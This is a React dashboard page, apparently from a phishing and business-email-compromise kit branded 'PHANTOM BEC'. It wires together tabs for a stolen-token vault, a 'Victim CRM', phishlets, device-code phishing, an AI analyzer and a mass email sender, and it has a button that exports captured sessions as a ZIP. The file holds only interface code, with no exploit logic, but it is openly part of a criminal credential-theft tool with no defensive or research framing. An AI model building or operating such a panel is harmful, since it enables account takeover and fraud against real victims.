'use client';

import { useState } from 'react';
import { Stats } from './components/Stats';
import { LogTable } from './components/LogTable';
import { VaultTable } from './components/VaultTable';
import { DeviceTable } from './components/DeviceTable';
import { PhishletManager } from './components/PhishletManager';
import { CRMManager } from './components/CRMManager';
import { AIAnalyzer } from './components/AIAnalyzer';
import { EmailSender } from './components/EmailSender';
import toast from 'react-hot-toast';

type Tab = 'dashboard' | 'vault' | 'crm' | 'ai' | 'email' | 'phishlets' | 'device';

export default function DashboardPage() {
  const [activeTab, setActiveTab] = useState<Tab>('dashboard');

  const tabs: { id: Tab; label: string; icon: string }[] = [
    { id: 'dashboard', label: 'Dashboard', icon: '📊' },
    { id: 'vault', label: 'Token Vault', icon: '🏛️' },
    { id: 'crm', label: 'Victim CRM', icon: '👥' },
    { id: 'ai', label: 'AI Analyzer', icon: '🤖' },
    { id: 'email', label: 'Email Sender', icon: '📧' },
    { id: 'phishlets', label: 'Phishlets', icon: '🎭' },
    { id: 'device', label: 'Device Code', icon: '📱' },
  ];

  const exportAll = async () => {
    try {
      const res = await fetch('/dash/api/export/all');
      if (!res.ok) throw new Error('Export failed');
      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `sessions_${Date.now()}.zip`;
      a.click();
      a.remove();
      toast.success('Export successful!');
    } catch (error) {
      toast.error('Export failed');
    }
  };

  const toggleTheme = () => {
    document.body.classList.toggle('light-glass');
    const isLight = document.body.classList.contains('light-glass');
    localStorage.setItem('theme', isLight ? 'light' : 'dark');
  };

  return (
    <div className="container mx-auto p-4 max-w-7xl">
      {/* Header */}
      <header className="glass p-5 flex flex-wrap justify-between items-center gap-4 mb-6">
        <h1 className="text-2xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
          😈 PHANTOM BEC
        </h1>
        <div className="flex gap-2 flex-wrap">
          <button onClick={toggleTheme} className="btn">🌓 Theme</button>
          <button onClick={exportAll} className="btn btn-primary">📦 Export ZIP</button>
          <button
            onClick={() => window.open('/device', '_blank')}
            className="btn border-yellow-500/30 text-yellow-400"
          >
            📱 Device Code
          </button>
        </div>
      </header>

      {/* Stats (only on dashboard) */}
      {activeTab === 'dashboard' && <Stats />}

      {/* Tabs */}
      <div className="flex gap-1 overflow-x-auto glass p-1 mb-6">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`px-4 py-2 rounded-full text-sm font-medium transition whitespace-nowrap ${
              activeTab === tab.id
                ? 'bg-purple-500/20 text-purple-300 border border-purple-500/30'
                : 'text-white/40 hover:text-white/70'
            }`}
          >
            {tab.icon} {tab.label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="space-y-6">
        {activeTab === 'dashboard' && <LogTable />}
        {activeTab === 'vault' && <VaultTable />}
        {activeTab === 'crm' && <CRMManager />}
        {activeTab === 'ai' && <AIAnalyzer />}
        {activeTab === 'email' && <EmailSender />}
        {activeTab === 'phishlets' && <PhishletManager />}
        {activeTab === 'device' && <DeviceTable />}
      </div>
    </div>
  );
}
